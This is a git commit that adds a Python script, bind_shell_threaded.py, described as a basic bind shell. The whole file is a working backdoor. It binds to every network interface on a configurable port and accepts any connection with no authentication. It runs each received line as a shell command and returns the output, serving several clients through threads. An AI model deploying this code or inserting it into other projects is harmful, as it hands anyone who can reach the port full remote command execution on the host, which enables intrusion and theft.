4196b47d00dfb4dd4f92d9709ef5b2ed4ac9bda7
w33iss <siomidenis21@gmail.com>
2023-05-22 04:59:13 +0300

    Basic bind shell with python

---
+++ bind_shell_threaded.py
@@ -0,0 +1,45 @@
+#!/usr/bin/python3
+#author : weiss
+
+import socket
+import subprocess
+import click
+from threading import Thread
+
+def run_cmd(cmd):
+	output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell = True)
+	return output.stdout
+
+def handle_command(client_socket):
+	while True:
+		chunks = []
+		chunk = client_socket.recv(2048)
+		chunks.append(chunk)
+
+		while(len(chunk) != 0 and chr(chunk[-1]) != '\n'):
+			chunk = client_socket.recv(2048)
+			chunks.append(chunk)
+
+		cmd = (b''.join(chunks)).decode()[:-1]
+
+		if cmd.lower() == 'exit':
+			client_socket.close()
+			break
+
+		output = run_cmd(cmd)
+		client_socket.sendall(output)
+
+@click.command()
+@click.option('--port', '-p', default = 9001)
+def main(port):
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.bind(('0.0.0.0',port))
+	s.listen(4)
+	
+	while True:
+		client_socket, _ = s.accept()
+		t = Thread(target = handle_command, args=(client_socket, ))
+		t.start()
+
+if __name__ == '__main__':
+	main()
